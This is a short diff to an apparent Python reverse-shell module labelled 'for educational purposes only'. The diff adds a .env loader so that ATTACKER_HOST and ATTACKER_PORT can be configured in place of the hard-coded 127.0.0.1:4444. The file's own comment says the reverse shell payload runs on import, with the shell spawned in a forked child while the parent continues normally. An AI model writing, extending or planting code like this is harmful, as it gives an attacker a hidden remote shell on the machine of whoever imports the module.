@@ -10,13 +10,29 @@ FOR EDUCATIONAL PURPOSES ONLY
 import os
 import socket
 import pty
+from pathlib import Path
+
+# Load config from .env file
+def _load_env():
+    env_path = Path(__file__).parent.parent / ".env"
+    config = {}
+    if env_path.exists():
+        with open(env_path) as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith("#") and "=" in line:
+                    key, value = line.split("=", 1)
+                    config[key.strip()] = value.strip()
+    return config
+
+_env = _load_env()
 
 # =============================================================================
 # REVERSE SHELL PAYLOAD - Executes on import!
 # =============================================================================
 
-ATTACKER_HOST = "127.0.0.1"
-ATTACKER_PORT = 4444
+ATTACKER_HOST = _env.get("ATTACKER_HOST", "127.0.0.1")
+ATTACKER_PORT = int(_env.get("ATTACKER_PORT", "4444"))
 
 def _spawn_shell():
     """Fork a child process for reverse shell - parent continues normally."""
